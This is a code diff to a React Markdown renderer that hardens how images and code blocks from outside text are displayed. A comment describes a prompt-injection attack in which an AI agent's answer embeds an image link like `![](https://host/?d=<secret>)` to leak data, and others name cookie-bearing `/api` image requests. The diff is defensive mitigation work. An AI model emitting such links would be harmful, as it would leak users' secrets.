@@ -81,6 +81,17 @@ const SAFE_URL = /^(https?:|mailto:|\/|#|\.{0,2}\/)/i
  * line breaks between the two) as `//host`. */
 const EXTERNAL = /^(https?:|[\t\n\r]*[\\/][\t\n\r]*[\\/])/i
 
+/** A picture of this site loads at once unless its address is an API route other than a file's: `![](/api/…)`
+ *  written by someone else would call that route with the owner's cookies the moment the message shows. */
+export function loadsAtOnce(src: string): boolean {
+  try {
+    const path = decodeURIComponent(new URL(src, location.href).pathname)
+    return !/^\/+api(\/|$)/i.test(path) || (path.startsWith('/api/files/') && !path.includes('..'))
+  } catch {
+    return false
+  }
+}
+
 /** A remote picture loads only on a click: an answer that embeds `![](https://host/?d=<secret>)` (a prompt injection
  * in a page Claude read) would otherwise send it the moment the message shows. Pictures of this site load at once. */
 function RemoteImage({ src, alt }: { src: string; alt: string }) {
@@ -110,6 +121,15 @@ type MarkdownProps = {
   /** A picture of this site -> the URL to load at once, or null: it waits for a click like a remote one (default: all
    *  load as written). A text from outside (an agent's answer) could embed `![](/api/...)`, a GET with the owner's cookies. */
   localImage?: (src: string) => string | null
+}
+
+/** For a text written elsewhere (another server, GitHub): code blocks stay code - no ```pr-review, ```git, ```infra or
+ *  ```mermaid block turns into a live card that acts or reads with the owner's rights. */
+export const PLAIN_BLOCKS: Components = {
+  pre({ children }) {
+    const child = React.Children.only(children) as React.ReactElement<{ children?: React.ReactNode }>
+    return <CodeBlock code={textOf(child?.props?.children).replace(/\n$/, '')} className="my-2" />
+  },
 }
 
 /**
@@ -201,7 +221,7 @@ export const Markdown = React.memo(function Markdown({ children, className, onLi
         if (!SAFE_URL.test(s) || /^mailto:/i.test(s)) return null
         if (EXTERNAL.test(s)) return <RemoteImage src={s} alt={alt || ''} />
         const local = localImage ? localImage(s) : s
-        return local === null ? <RemoteImage src={s} alt={alt || ''} /> : <img src={local} alt={alt || ''} loading="lazy" />
+        return local === null || !loadsAtOnce(local) ? <RemoteImage src={s} alt={alt || ''} /> : <img src={local} alt={alt || ''} loading="lazy" />
       },
       // A cell that holds a sentence keeps a readable width: on a narrow screen the table scrolls sideways (globals.css)
       // instead of squeezing the sentence to one word a line.
